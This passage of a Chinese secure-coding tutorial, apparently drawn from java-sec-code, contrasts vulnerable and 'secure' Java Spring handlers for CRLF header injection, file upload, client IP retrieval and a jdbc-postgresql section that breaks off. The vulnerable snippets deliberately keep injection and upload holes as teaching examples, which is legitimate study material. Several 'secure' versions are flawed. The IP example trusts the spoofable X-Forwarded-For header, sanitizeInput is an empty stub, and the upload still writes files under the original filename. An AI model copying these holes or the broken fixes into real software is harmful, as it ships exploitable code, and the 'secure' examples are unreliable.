<h3 id="漏洞代码-6"><a href="#漏洞代码-6" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/safecode&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">crlf</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">    response.addHeader(<span class="string">&quot;test1&quot;</span>, request.getParameter(<span class="string">&quot;test1&quot;</span>));</span><br><span class="line">    response.setHeader(<span class="string">&quot;test2&quot;</span>, request.getParameter(<span class="string">&quot;test2&quot;</span>));</span><br><span class="line">    <span class="type">String</span> <span class="variable">author</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;test3&quot;</span>);</span><br><span class="line">    <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;test3&quot;</span>, author);</span><br><span class="line">    response.addCookie(cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>HTTP响应拆分：</strong> 通过注入CRLF序列，攻击者可以在HTTP响应头中添加额外的内容，绕过应用程序的预期响应，可能导致HTTP响应拆分攻击。</li>
<li><strong>Cookie注入攻击：</strong> 通过在<code>test3</code>参数中注入CRLF序列，攻击者可以尝试注入额外的Cookie头，从而实现Cookie注入攻击，劫持用户会话。</li>
</ul>
<h3 id="安全代码-7"><a href="#安全代码-7" class="headerlink" title="安全代码"></a>安全代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/securecode&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">secureCRLF</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">test1</span> <span class="operator">=</span> sanitizeInput(request.getParameter(<span class="string">&quot;test1&quot;</span>));</span><br><span class="line">    <span class="type">String</span> <span class="variable">test2</span> <span class="operator">=</span> sanitizeInput(request.getParameter(<span class="string">&quot;test2&quot;</span>));</span><br><span class="line">    <span class="type">String</span> <span class="variable">test3</span> <span class="operator">=</span> sanitizeInput(request.getParameter(<span class="string">&quot;test3&quot;</span>));</span><br><span class="line"></span><br><span class="line">    response.addHeader(<span class="string">&quot;test1&quot;</span>, test1);</span><br><span class="line">    response.setHeader(<span class="string">&quot;test2&quot;</span>, test2);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 此处需要确保test3的值符合Cookie的安全规范</span></span><br><span class="line">    <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;test3&quot;</span>, test3);</span><br><span class="line">    response.addCookie(cookie);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> String <span class="title function_">sanitizeInput</span><span class="params">(String input)</span> &#123;</span><br><span class="line">    <span class="comment">// 对输入进行适当的验证和过滤，确保不包含恶意的CRLF序列</span></span><br><span class="line">    <span class="comment">// 这可以使用白名单、正则表达式等来实现</span></span><br><span class="line">    <span class="comment">// 返回处理</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/JoyChou93/java-sec-code/wiki/Fastjson">Fastjson · JoyChou93&#x2F;java-sec-code Wiki (github.com)</a></p>
</blockquote>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h3 id="敏感方法-5"><a href="#敏感方法-5" class="headerlink" title="敏感方法"></a>敏感方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytes = file.getBytes();</span><br><span class="line"><span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());</span><br><span class="line">Files.write(path, bytes);</span><br></pre></td></tr></table></figure>

<h3 id="漏洞代码-7"><a href="#漏洞代码-7" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/upload&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">singleFileUpload</span><span class="params">(<span class="meta">@RequestParam(&quot;file&quot;)</span> MultipartFile file,</span></span><br><span class="line"><span class="params">                               RedirectAttributes redirectAttributes)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (file.isEmpty()) &#123;</span><br><span class="line">        <span class="comment">// 赋值给uploadStatus.html里的动态参数message</span></span><br><span class="line">        redirectAttributes.addFlashAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Please select a file to upload&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/file/status&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// Get the file and save it somewhere</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = file.getBytes();</span><br><span class="line">        <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());</span><br><span class="line">        Files.write(path, bytes);</span><br><span class="line"></span><br><span class="line">        redirectAttributes.addFlashAttribute(<span class="string">&quot;message&quot;</span>,</span><br><span class="line">                <span class="string">&quot;You successfully uploaded &#x27;&quot;</span> + UPLOADED_FOLDER + file.getOriginalFilename() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        redirectAttributes.addFlashAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;upload failed&quot;</span>);</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;redirect:/file/status&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="安全代码-8"><a href="#安全代码-8" class="headerlink" title="安全代码"></a>安全代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">@PostMapping(&quot;/upload/picture&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">uploadPicture</span><span class="params">(<span class="meta">@RequestParam(&quot;file&quot;)</span> MultipartFile multifile)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (multifile.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Please select a file to upload&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> multifile.getOriginalFilename();</span><br><span class="line">        <span class="type">String</span> <span class="variable">Suffix</span> <span class="operator">=</span> fileName.substring(fileName.lastIndexOf(<span class="string">&quot;.&quot;</span>)); <span class="comment">// 获取文件后缀名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">mimeType</span> <span class="operator">=</span> multifile.getContentType(); <span class="comment">// 获取MIME类型</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> UPLOADED_FOLDER + fileName;</span><br><span class="line">        <span class="type">File</span> <span class="variable">excelFile</span> <span class="operator">=</span> convert(multifile);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//文件</span></span><br><span class="line">        <span class="comment">// 判断文件后缀名是否在白名单内  校验1</span></span><br><span class="line">        String[] picSuffixList = &#123;<span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.png&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.bmp&quot;</span>, <span class="string">&quot;.ico&quot;</span>&#125;;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">suffixFlag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (String white_suffix : picSuffixList) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Suffix.toLowerCase().equals(white_suffix)) &#123;</span><br><span class="line">                suffixFlag = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!suffixFlag) &#123;</span><br><span class="line">            logger.error(<span class="string">&quot;[-] Suffix error: &quot;</span> + Suffix);</span><br><span class="line">            deleteFile(filePath);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Upload failed. Illeagl picture.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断MIME类型是否在黑名单内 校验2</span></span><br><span class="line">        String[] mimeTypeBlackList = &#123;</span><br><span class="line">                <span class="string">&quot;text/html&quot;</span>,</span><br><span class="line">                <span class="string">&quot;text/javascript&quot;</span>,</span><br><span class="line">                <span class="string">&quot;application/javascript&quot;</span>,</span><br><span class="line">                <span class="string">&quot;application/ecmascript&quot;</span>,</span><br><span class="line">                <span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">                <span class="string">&quot;application/xml&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (String blackMimeType : mimeTypeBlackList) &#123;</span><br><span class="line">            <span class="comment">// 用contains是为了防止text/html;charset=UTF-8绕过</span></span><br><span class="line">            <span class="keyword">if</span> (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) &#123;</span><br><span class="line">                logger.error(<span class="string">&quot;[-] Mime type error: &quot;</span> + mimeType);</span><br><span class="line">                deleteFile(filePath);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Upload failed. Illeagl picture.&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断文件内容是否是图片 校验3</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isImageFlag</span> <span class="operator">=</span> isImage(excelFile);</span><br><span class="line">        deleteFile(randomFilePath);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!isImageFlag) &#123;</span><br><span class="line">            logger.error(<span class="string">&quot;[-] File is not Image&quot;</span>);</span><br><span class="line">            deleteFile(filePath);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Upload failed. Illeagl picture.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Get the file and save it somewhere</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = multifile.getBytes();</span><br><span class="line">            <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename());</span><br><span class="line">            Files.write(path, bytes);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            deleteFile(filePath);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Upload failed&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        logger.info(<span class="string">&quot;[+] Safe file. Suffix: &#123;&#125;, MIME: &#123;&#125;&quot;</span>, Suffix, mimeType);</span><br><span class="line">        logger.info(<span class="string">&quot;[+] Successfully uploaded &#123;&#125;&quot;</span>, filePath);</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;You successfully uploaded &#x27;%s&#x27;&quot;</span>, filePath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">deleteFile</span><span class="params">(String filePath)</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">delFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filePath);</span><br><span class="line">        <span class="keyword">if</span>(delFile.isFile() &amp;&amp; delFile.exists()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (delFile.delete()) &#123;</span><br><span class="line">                logger.info(<span class="string">&quot;[+] &quot;</span> + filePath + <span class="string">&quot; delete successfully!&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        logger.info(filePath + <span class="string">&quot; delete failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 为了使用ImageIO.read()</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 不建议使用transferTo，因为原始的MultipartFile会被覆盖</span></span><br><span class="line"><span class="comment">     * https://stackoverflow.com/questions/24339990/how-to-convert-a-multipart-file-to-file</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> File <span class="title function_">convert</span><span class="params">(MultipartFile multiFile)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> multiFile.getOriginalFilename();</span><br><span class="line">        <span class="type">String</span> <span class="variable">suffix</span> <span class="operator">=</span> fileName.substring(fileName.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="type">UUID</span> <span class="variable">uuid</span> <span class="operator">=</span> Generators.timeBasedGenerator().generate();</span><br><span class="line">        randomFilePath = UPLOADED_FOLDER + uuid + suffix;</span><br><span class="line">        <span class="comment">// 随机生成一个同后缀名的文件</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">convFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(randomFilePath);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">ret</span> <span class="operator">=</span> convFile.createNewFile();</span><br><span class="line">        <span class="keyword">if</span> (!ret) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(convFile);</span><br><span class="line">        fos.write(multiFile.getBytes());</span><br><span class="line">        fos.close();</span><br><span class="line">        <span class="keyword">return</span> convFile;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Check if the file is a picture.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isImage</span><span class="params">(File file)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">BufferedImage</span> <span class="variable">bi</span> <span class="operator">=</span> ImageIO.read(file);</span><br><span class="line">        <span class="keyword">return</span> bi != <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>通过白名单根据文件后缀进行过滤；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 判断文件后缀名是否在白名单内  校验1</span></span><br><span class="line">        String[] picSuffixList = &#123;<span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.png&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.bmp&quot;</span>, <span class="string">&quot;.ico&quot;</span>&#125;;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">suffixFlag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (String white_suffix : picSuffixList) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Suffix.toLowerCase().equals(white_suffix)) &#123;</span><br><span class="line">                suffixFlag = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!suffixFlag) &#123;</span><br><span class="line">            logger.error(<span class="string">&quot;[-] Suffix error: &quot;</span> + Suffix);</span><br><span class="line">            deleteFile(filePath);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Upload failed. Illeagl picture.&quot;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过黑名单根据MIME类型进行过滤；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 判断MIME类型是否在黑名单内 校验2</span></span><br><span class="line">String[] mimeTypeBlackList = &#123;</span><br><span class="line">                <span class="string">&quot;text/html&quot;</span>,</span><br><span class="line">                <span class="string">&quot;text/javascript&quot;</span>,</span><br><span class="line">                <span class="string">&quot;application/javascript&quot;</span>,</span><br><span class="line">                <span class="string">&quot;application/ecmascript&quot;</span>,</span><br><span class="line">                <span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">                <span class="string">&quot;application/xml&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (String blackMimeType : mimeTypeBlackList) &#123;</span><br><span class="line">            <span class="comment">// 用contains是为了防止text/html;charset=UTF-8绕过</span></span><br><span class="line">            <span class="keyword">if</span> (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) &#123;</span><br><span class="line">                logger.error(<span class="string">&quot;[-] Mime type error: &quot;</span> + mimeType);</span><br><span class="line">                deleteFile(filePath);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Upload failed. Illeagl picture.&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>判断文件内容是否为图片；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isImage</span><span class="params">(File file)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">BufferedImage</span> <span class="variable">bi</span> <span class="operator">=</span> ImageIO.read(file);</span><br><span class="line">    <span class="keyword">return</span> bi != <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="IP地址获取"><a href="#IP地址获取" class="headerlink" title="IP地址获取"></a>IP地址获取</h1><h3 id="敏感方法-6"><a href="#敏感方法-6" class="headerlink" title="敏感方法"></a>敏感方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">request.getRemoteAddr();</span><br><span class="line">request.getHeader(<span class="string">&quot;X-Real-IP&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="漏洞代码-8"><a href="#漏洞代码-8" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/noproxy&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">noProxy</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> request.getRemoteAddr();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/proxy&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">proxy</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;X-Real-IP&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isNotBlank(ip)) &#123;</span><br><span class="line">        <span class="keyword">return</span> ip;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">remoteAddr</span> <span class="operator">=</span> request.getRemoteAddr();</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isNotBlank(remoteAddr)) &#123;</span><br><span class="line">            <span class="keyword">return</span> remoteAddr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="安全代码-9"><a href="#安全代码-9" class="headerlink" title="安全代码"></a>安全代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/secured&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">securedEndpoint</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 获取请求对象</span></span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取真实的客户端IP地址</span></span><br><span class="line">    <span class="comment">/*ClientIp获取顺序：</span></span><br><span class="line"><span class="comment">    1. [HTTP HEAD]X-Forwarded-For</span></span><br><span class="line"><span class="comment">    2. [HTTP HEAD]Proxy-Client-IP</span></span><br><span class="line"><span class="comment">    3. [HTTP HEAD]WL-Proxy-Client-IP</span></span><br><span class="line"><span class="comment">    4. request.getRemoteAddr();</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">clientIp</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;X-Forwarded-For&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (clientIp == <span class="literal">null</span> || clientIp.isEmpty() || <span class="string">&quot;unknown&quot;</span>.equalsIgnoreCase(clientIp)) &#123;</span><br><span class="line">        clientIp = request.getHeader(<span class="string">&quot;Proxy-Client-IP&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (clientIp == <span class="literal">null</span> || clientIp.isEmpty() || <span class="string">&quot;unknown&quot;</span>.equalsIgnoreCase(clientIp)) &#123;</span><br><span class="line">        clientIp = request.getHeader(<span class="string">&quot;WL-Proxy-Client-IP&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (clientIp == <span class="literal">null</span> || clientIp.isEmpty() || <span class="string">&quot;unknown&quot;</span>.equalsIgnoreCase(clientIp)) &#123;</span><br><span class="line">        clientIp = request.getRemoteAddr();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clientIp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="jdbc-postgresql漏洞"><a href="#jdbc-postgresql漏洞" class="headerlink" title="jdbc-postgresql漏洞"></a>jdbc-postgresql漏洞</h1><h3 id="敏感函数"><a href="#敏感函数" class="headerlink" title="敏感函数"></a>敏感函数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DriverManager.getConnection(jdbcUrl);</span><br></pre></td></tr></table></figure>

